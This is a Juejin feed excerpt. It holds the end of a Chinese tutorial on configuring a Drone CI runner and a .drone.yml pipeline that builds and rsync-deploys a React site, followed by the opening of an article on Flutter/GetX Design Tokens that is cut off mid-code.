<li>对应上文 <code>Git OAuth</code> 的 <code>Client ID</code> 和 <code>Client Secret</code>，用于身份认证</li>
</ul>
</li>
<li>
<p><strong>DRONE_RPC_SECRET</strong> - 是刚刚生成的共享密钥，用于 Server 与 Runner 通信</p>
</li>
<li>
<p><strong>DRONE_SERVER_HOST</strong> - 改为服务器的真实IP和设置运行的端口</p>
</li>
<li>
<p><strong>DRONE_SERVER_PROTO</strong> - 我只用到了 http，如有证书可设置 https</p>
</li>
<li>
<p><strong>DRONE_USER_CREATE</strong> - 设置账户，name 为 github 账号名</p>
</li>
</ul>
<p>此时我们启动服务</p>
<p><code>docker compose up -d drone-server</code></p>
<p>访问对应的公网网址，完成登录后（记得在Github修改 homepageURL + Authorization callback URL）,即可看到自己仓库的所有项目。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e4e1162e174241d8b28187bea7ef1f95~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6KW_57u0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764557813&amp;x-signature=A5c8UKTBP1inm9lSFnzMTU%2BFWWg%3D" alt="QQ_1763943162285.png" loading="lazy"/></p>
<p>我们选中一个测试项目的进行激活。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fdfe66f8cd2e46849e08554bbed908a8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6KW_57u0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764557813&amp;x-signature=61wBqRYc7FPzN%2BokC2u7ZsOFtMg%3D" alt="QQ_1763944058118.png" loading="lazy"/></p>
<p>可以看到 github - 项目 - webhooks 已经激活了。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6387a67307fd4dd5a17351f7baa907e4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6KW_57u0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764557813&amp;x-signature=M4I29bF%2F0oaOERrUpmb%2BYKOWf7c%3D" alt="QQ_1763944228665.png" loading="lazy"/></p>
<p>对项目进行简单的配置 Trusted -&gt; SAVE。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7ec677e54f914e3e95a0a9a21bdf5707~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6KW_57u0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764557813&amp;x-signature=Z6GPIQG%2B%2BPp7ftTVtfu86t66Da0%3D" alt="QQ_1763945071913.png" loading="lazy"/></p>
<h4 data-id="heading-10">drone-runer</h4>
<p><code>/opt/docker/docker-compose.yml</code></p>
<pre><code class="hljs language-yml" lang="yml">  <span class="hljs-comment"># drone 执行者（runer）</span>
  <span class="hljs-attr">drone-runner:</span> 
    <span class="hljs-attr">container_name:</span> <span class="hljs-string">drone-runner</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">drone/drone-runner-docker:latest</span>
    <span class="hljs-attr">restart:</span> <span class="hljs-string">always</span>
    <span class="hljs-attr">ports:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-number">3000</span><span class="hljs-string">:3000</span>  

    <span class="hljs-attr">volumes:</span>
      <span class="hljs-comment"># 允许 Runner 在宿主机上操作 Docker 容器</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">/var/run/docker.sock:/var/run/docker.sock</span>
    <span class="hljs-attr">environment:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">DRONE_RPC_PROTO=http</span>
      <span class="hljs-comment"># 与 drone server 的container_name一致</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">DRONE_RPC_HOST=drone-server</span>
      <span class="hljs-comment"># Drone Server 和 Runner 之间的 RPC 认证密钥，需保持一致</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">DRONE_RPC_SECRET=c1da0391xxxxxxxxxxxxxxxx</span>
      <span class="hljs-comment"># 设置并发任务数上限</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">DRONE_RUNNER_CAPACITY=3</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">DRONE_RUNNER_NAME=drone-runner</span>
    <span class="hljs-attr">depends_on:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">drone-server</span>
</code></pre>
<ul>
<li><strong>volumes</strong> - runner 执行流水线时需要不断地创建镜像容器，需要允许其操作 Docker</li>
<li><strong>DRONE_RPC_HOST</strong> - 同服务器可内部访问使用 <code>container-name</code> 即可，如果跨服务器请填写 Drone Server 的域名 或 IP+端口</li>
<li><strong>DRONE_RPC_SECRET</strong> - 共享密钥，与Server保持一致</li>
</ul>
<p>自动构建与部署等功能都依赖于 Drone Runner。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/60f13afc47264c13b9f6dfe699541a6e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6KW_57u0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764557813&amp;x-signature=VCoBqvG0xk0ZVpRdAqT087b82OY%3D" alt="QQ_1763945783911.png" loading="lazy"/></p>
<h4 data-id="heading-11">pipeline &amp; .drone.yml</h4>
<blockquote>
<p>流水线（Pipeline）在软件工程中，特别是在持续集成和持续部署（CI/CD）中，是一个自动化流程，它将软件从代码到交付的多个步骤串联起来。</p>
<p>每个步骤都会完成一个特定的任务（例如编译、测试、部署），并且这些步骤按顺序执行，如果其中一个步骤失败，整个流程就会停止，从而保证软件质量。</p>
</blockquote>
<p>简单来说，<strong>Pipeline 是把手动重复的软件发布过程，变成全自动的标准化流水线</strong>。无需人工干预，提高了效率并减少了人为错误。</p>
<p>而 <strong>YAML 是流水线的「说明书」，语法易于阅读和表达，能用结构化的文字描述整个自动化流程</strong>。</p>
<p><code>Drone</code> 通过在项目的根目录中放置 <code>.drone.yml</code> 文件来配置流水线。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ef1dbd577bf34c7f9a266c0fd58aaac0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6KW_57u0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764557813&amp;x-signature=G%2F6b4ZDV5%2B8G8mio3mQIq%2B0pliE%3D" alt="QQ_1763947331160.png" loading="lazy"/></p>
<p>关于 <code>.drone.yml</code> 文件，通常有以下规则：</p>
<ul>
<li>每个配置文件都以 <code>kind: pipeline</code> 开头</li>
<li>需要指定<strong>执行器类型</strong>，例如Docker（<code>type: docker</code>）</li>
<li>需要设置 <strong>触发条件（Trigger）</strong>，控制管道在<strong>何时</strong>运行。最常用的是代码的 <code>push</code> 事件</li>
<li><strong>步骤（Steps）</strong>
<ul>
<li>管道由一个或多个<strong>步骤</strong>组成，每个步骤代表一个独立的任务（例如安装依赖、构建、测试、部署）。</li>
<li>每个步骤通常需要指定：
<ul>
<li><strong>名称（name）</strong> ：步骤标识，例如 <code>build</code>、<code>deploy</code></li>
<li><strong>镜像（image）</strong> ：执行任务的Docker镜像，这决定了步骤的运行环境</li>
<li><strong>命令（commands）</strong> ：在容器内执行的Shell命令序列。</li>
</ul>
</li>
</ul>
</li>
<li><strong>挂载卷（Volumes）</strong> ，用于在步骤之间<strong>持久化数据</strong>或与宿主机<strong>共享文件</strong></li>
<li>...</li>
</ul>
<p>官方文档 <a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.drone.io%2Fpipeline%2Foverview%2F" target="_blank" title="https://docs.drone.io/pipeline/overview/" ref="nofollow noopener noreferrer">docs.drone.io/pipeline/ov…</a></p>
<p>我们可以在steps里集成插件，drone plugins <a href="https://link.juejin.cn?target=https%3A%2F%2Fplugins.drone.io%2F" target="_blank" title="https://plugins.drone.io/" ref="nofollow noopener noreferrer">plugins.drone.io/</a></p>
<p>例如 用于通知构建状态的 slack，用于文件传输的 rsync，发布资源到S3的 AWS S3/AWS S3 Sync，等等。</p>
<p>我的项目（React + Yarn + Vite）构建配置如下：</p>
<p><strong><code>./.drone.yml</code></strong></p>
<pre><code class="hljs language-yml" lang="yml"><span class="hljs-comment"># 定义一个管道</span>
<span class="hljs-attr">kind:</span> <span class="hljs-string">pipeline</span>
<span class="hljs-comment"># 定义管道类型</span>
<span class="hljs-comment"># 使用Docker执行器运行流水线</span>
<span class="hljs-attr">type:</span> <span class="hljs-string">docker</span>
<span class="hljs-attr">name:</span> <span class="hljs-string">default</span>

<span class="hljs-comment"># drone启动时，都会先执行clone代码操作，将对应仓库代码拉取到/drone/src目录下</span>
<span class="hljs-attr">clone:</span>
  <span class="hljs-comment"># 重试以防网络问题导致clone失败</span>
  <span class="hljs-attr">retries:</span> <span class="hljs-number">2</span>

<span class="hljs-attr">trigger:</span>
  <span class="hljs-attr">branch:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">main</span>

<span class="hljs-attr">volumes:</span>
    <span class="hljs-comment"># 将node_modules缓存到宿主机指定目录下</span>
    <span class="hljs-comment"># 避免重新install延迟或者失败</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">node_modules</span>
    <span class="hljs-attr">host:</span>
      <span class="hljs-attr">path:</span> <span class="hljs-string">/home/drone/cache/fe/node_modules</span>
  <span class="hljs-comment"># - name: pnpm-cache</span>
  <span class="hljs-comment">#   host:</span>
  <span class="hljs-comment">#     path: /home/drone/cache/fe/pnpm-store</span>
  <span class="hljs-comment"># 挂载Docker套接字</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">docker-sock</span>
    <span class="hljs-attr">host:</span>
      <span class="hljs-attr">path:</span> <span class="hljs-string">/var/run/docker.sock</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">admin-website</span>
    <span class="hljs-attr">host:</span>
      <span class="hljs-attr">path:</span> <span class="hljs-string">/home/admin-website</span>

<span class="hljs-attr">steps:</span>
  <span class="hljs-comment"># 编译阶段</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">build</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">node:23</span>
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">node_modules</span>
        <span class="hljs-comment"># 挂载到容器内的路径</span>
        <span class="hljs-comment"># 宿主机 node_modules -&gt; 挂载到容器/drone/src/node_modules目录</span>
        <span class="hljs-attr">path:</span> <span class="hljs-string">/drone/src/node_modules</span>
    <span class="hljs-comment">#   - name: pnpm-cache</span>
    <span class="hljs-comment">#     path: /drone/src/.pnpm-store</span>
    <span class="hljs-attr">commands:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">echo</span> <span class="hljs-string">"============构建前的文件==============="</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">pwd</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">ls</span> <span class="hljs-string">-alt</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">echo</span> <span class="hljs-string">"======================================"</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">yarn</span> <span class="hljs-string">--version</span> <span class="hljs-string">||</span> <span class="hljs-string">npm</span> <span class="hljs-string">install</span> <span class="hljs-string">-g</span> <span class="hljs-string">yarn</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">yarn</span> <span class="hljs-string">install</span> <span class="hljs-string">--frozen-lockfile</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">yarn</span> <span class="hljs-string">build</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">echo</span> <span class="hljs-string">"============构建后的产物==============="</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">ls</span> <span class="hljs-string">-la</span> <span class="hljs-string">dist</span> <span class="hljs-string">||</span> <span class="hljs-string">exit</span> <span class="hljs-number">1</span>

  <span class="hljs-comment"># 部署阶段</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">deploy</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">drillster/drone-rsync</span>
    <span class="hljs-attr">network_mode:</span> <span class="hljs-string">host</span>  <span class="hljs-comment"># 使用宿主机网络</span>
    <span class="hljs-attr">settings:</span>
      <span class="hljs-attr">hosts:</span>
        <span class="hljs-bullet">-</span> <span class="hljs-string">localhost</span>
        <span class="hljs-comment"># 或者服务器ip</span>
      <span class="hljs-attr">user:</span> <span class="hljs-string">root</span>
      <span class="hljs-attr">key:</span>
        <span class="hljs-attr">from_secret:</span> <span class="hljs-string">deploy_ssh_secret</span>
      <span class="hljs-attr">port:</span> <span class="hljs-number">22</span>
      <span class="hljs-attr">source:</span> <span class="hljs-string">dist/</span>
      <span class="hljs-attr">target:</span> <span class="hljs-string">/home/admin-website</span>

  <span class="hljs-comment"># 如果在同一个服务器，可以把代码直接编译进挂载目录或者移入挂载目录</span>
  <span class="hljs-comment"># - name: deploy</span>
  <span class="hljs-comment">#   image: alpine:latest</span>
  <span class="hljs-comment">#   volumes:</span>
  <span class="hljs-comment">#     - name: admin-website</span>
  <span class="hljs-comment">#     # 在容器内提供target目录 挂载到宿主机的host目录下</span>
  <span class="hljs-comment">#       path: /target</span>
  <span class="hljs-comment">#   commands:</span>
  <span class="hljs-comment">#     - apk add --no-cache rsync</span>
  <span class="hljs-comment">#     # 将容器内的dist目录同步到target目录，给volumes挂载</span>
  <span class="hljs-comment">#     - rsync -av --delete /drone/src/dist/ /target/</span>
  <span class="hljs-comment">#     # 验证文件是否复制成功</span>
  <span class="hljs-comment">#     - ls -la /target/ || exit 1</span>
</code></pre>
<h2 data-id="heading-12">测试自动部署</h2>
<p>至此我们就大功告成，可以进行测试了，现在修改代码后 push 远程 <code>main</code> 分支，即可触发自动构建。</p>
<p>改一下项目版本号试试</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/17cea6d31322439bbb233da42865776a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6KW_57u0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764557813&amp;x-signature=K2ECaGrJeAEVlamrBKQtqt3EM3Q%3D" alt="QQ_1763949105773.png" loading="lazy"/></p>
<p>可以看到任务很快就完成了</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cd3c15b9917940daaeb5ca23da280ba0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6KW_57u0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764557813&amp;x-signature=b3isP6E83TTZTFQp7Rn2dnsWvps%3D" alt="QQ_1763949213983.png" loading="lazy"/>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/033486ca04964d889dcb716caa73ae20~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6KW_57u0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764557813&amp;x-signature=3UCM3hTMwcGIfsVZp44FnbCNyAo%3D" alt="QQ_1763949144336.png" loading="lazy"/></p>
<p>访问网站（记得配置 nginx 代理）</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e92d41c6b4ad428d9fc7347aebf291e9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6KW_57u0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764557813&amp;x-signature=YFMcFsSqM36C8QIvgQ8veYXd1lc%3D" alt="QQ_1763949190599.png" loading="lazy"/></p>
<h2 data-id="heading-13">结语</h2>
<p>整套流程下来并不困难，但需要开发生涯中的多种知识为基础，并加以应用，理解完整的产品开发流程。</p>
<p>希望前端开发的思维不再局限于编码，从局部到全局，从编码到交付，做一个能独立交付产品的程序员。</p>
<p>如果公司里正好缺少对应的基建，便是你大展身手的机会。</p>
<p>还有很多细节值得我们讨论：</p>
<ol>
<li>镜像构建时如何缓存，避免重复的无效构建</li>
<li>如何将项目直接部署到多个服务器运行，而不需要多次配置nginx</li>
<li>部署后出现问题怎么快速回滚</li>
<li>自动化测试</li>
<li>. . .</li>
</ol>
<p>大家感兴趣的话，再写一文讨论。</p>
<p>不要光看不实践哦~ 希望本文能对你有所帮助</p>
<p>持续更新前端知识，脚踏实地不水文，真的不关注一下吗~</p>
<p>写作不易，如果有收获还望 点赞+收藏 🌹</p>
<blockquote>
<p>才疏学浅，如有问题或建议还望指教~</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[在 Flutter + GetX 中实现 Design Tokens 的完整方案]]></title>    <link>https://juejin.cn/post/7575469988737433609</link>    <guid>https://juejin.cn/post/7575469988737433609</guid>    <pubDate>2025-11-24T02:15:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575469988737433609" data-draft-id="7575533124877795355" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="在 Flutter + GetX 中实现 Design Tokens 的完整方案"/> <meta itemprop="keywords" content="Flutter"/> <meta itemprop="datePublished" content="2025-11-24T02:15:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="一名普通的程序员"/> <meta itemprop="url" content="https://juejin.cn/user/3913917126936087"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            在 Flutter + GetX 中实现 Design Tokens 的完整方案
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3913917126936087/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    一名普通的程序员
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T02:15:40.000Z" title="Mon Nov 24 2025 02:15:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>结合<a href="https://juejin.cn/post/7575438636332286003" target="_blank" title="https://juejin.cn/post/7575438636332286003">《Design Tokens的设计与使用详解：构建高效设计系统的核心技术》</a>的核心思想，在 Flutter 项目中使用 GetX 框架实现 Design Tokens 需要从<strong>分层架构、主题管理、状态控制和工具链集成</strong>四个维度进行系统性设计。以下是完整的实现方案：</p>
<h2 data-id="heading-0">一、Design Tokens 的分层架构设计</h2>
<p>根据论文中的分层管理结构（基础Token → 语义Token → 组件Token），在 Flutter 中应建立对应的三层架构：</p>
<h3 data-id="heading-1">1. 基础 Token 层（原始值定义）</h3>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// lib/tokens/foundation/colors.dart</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FoundationColors</span> </span>{
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>, Color&gt; palette = {
    <span class="hljs-comment">// 基础色系 - 采用色相-明度分级体系</span>
    <span class="hljs-string">'red-50'</span>: Color(<span class="hljs-number">0xFFF8D7DA</span>),
    <span class="hljs-string">'red-100'</span>: Color(<span class="hljs-number">0xFFF1B3B6</span>),
    <span class="hljs-string">'red-500'</span>: Color(<span class="hljs-number">0xFFD32F2F</span>),
    <span class="hljs-string">'red-700'</span>: Color(<span class="hljs-number">0xFFB71C1C</span>),
    
    <span class="hljs-string">'blue-50'</span>: Color(<span class="hljs-number">0xFFE3F2FD</span>),
    <span class="hljs-string">'blue-100'</span>: Color(<span class="hljs-number">0xFFBBDEFB</span>),
    <span class="hljs-string">'blue-500'</span>: Color(<span class="hljs-number">0xFF2196F3</span>),
    <span class="hljs-string">'blue-700'</span>: Color(<span class="hljs-number">0xFF1976D2</span>),
    
    <span class="hljs-string">'gray-50'</span>: Color(<span class="hljs-number">0xFFF5F5F5</span>),
    <span class="hljs-string">'gray-100'</span>: Color(<span class="hljs-number">0xFFE0E0E0</span>),
    <span class="hljs-string">'gray-300'</span>: Color(<span class="hljs-number">0xFF9E9E9E</span>),
    <span class="hljs-string">'gray-700'</span>: Color(<span class="hljs-number">0xFF616161</span>),
    <span class="hljs-string">'gray-900'</span>: Color(<span class="hljs-number">0xFF212121</span>),
  };
}

<span class="hljs-comment">// lib/tokens/foundation/spacing.dart</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FoundationSpacing</span> </span>{
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-built_in">double</span> xs = <span class="hljs-number">4.0</span>;
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-built_in">double</span> sm = <span class="hljs-number">8.0</span>;
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-built_in">double</span> md = <span class="hljs-number">16.0</span>;
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-built_in">double</span> lg = <span class="hljs-number">24.0</span>;
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-built_in">double</span> xl = <span class="hljs-number">32.0</span>;
}

<span class="hljs-comment">// lib/tokens/foundation/typography.dart</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FoundationTypography</span> </span>{
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> TextStyle bodySmall = TextStyle(
    fontSize: <span class="hljs-number">12.0</span>,
    fontWeight: FontWeight.w400,
    height: <span class="hljs-number">1.5</span>,
  );
  
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> TextStyle bodyMedium = TextStyle(
    fontSize: <span class="hljs-number">14.0</span>,
    fontWeight: FontWeight.w400,
    height: <span class="hljs-number">1.5</span>,
  );
  
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> TextStyle headlineSmall = TextStyle(
    fontSize: <span class="hljs-number">16.0</span>,
    fontWeight: FontWeight.w600,
    height: <span class="hljs-number">1.4</span>,
  );
}
</code></pre>
<h3 data-id="heading-2">2. 语义 Token 层（用途说明）</h3>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// lib/tokens/semantic/colors.dart</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SemanticColors</span> </span>{
  <span class="hljs-keyword">static</span> Color <span class="hljs-keyword">get</span> primary =&gt; FoundationColors.palette[<span class="hljs-string">'blue-500'</span>]!;
  <span class="hljs-keyword">static</span> Color <span class="hljs-keyword">get</span> primaryDark =&gt; FoundationColors.palette[<span class="hljs-string">'blue-700'</span>]!;
  <span class="hljs-keyword">static</span> Color <span class="hljs-keyword">get</span> error =&gt; FoundationColors.palette[<span class="hljs-string">'red-500'</span>]!;
  <span class="hljs-keyword">static</span> Color <span class="hljs-keyword">get</span> background =&gt; FoundationColors.palette[<span class="hljs-string">'gray-50'</span>]!;
  <span class="hljs-keyword">static</span> Color <span class="hljs-keyword">get</span> surface =&gt; Colors.white;
  <span class="hljs-keyword">static</span> Color <span class="hljs-keyword">get</span> onSurface =&gt; FoundationColors.palette[<span class="hljs-string">'gray-900'</span>]!;
  <span class="hljs-keyword">static</span> Color <span class="hljs-keyword">get</span> onPrimary =&gt; Colors.white;
}

<span class="hljs-comment">// lib/tokens/semantic/spacing.dart</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SemanticSpacing</span> </span>{
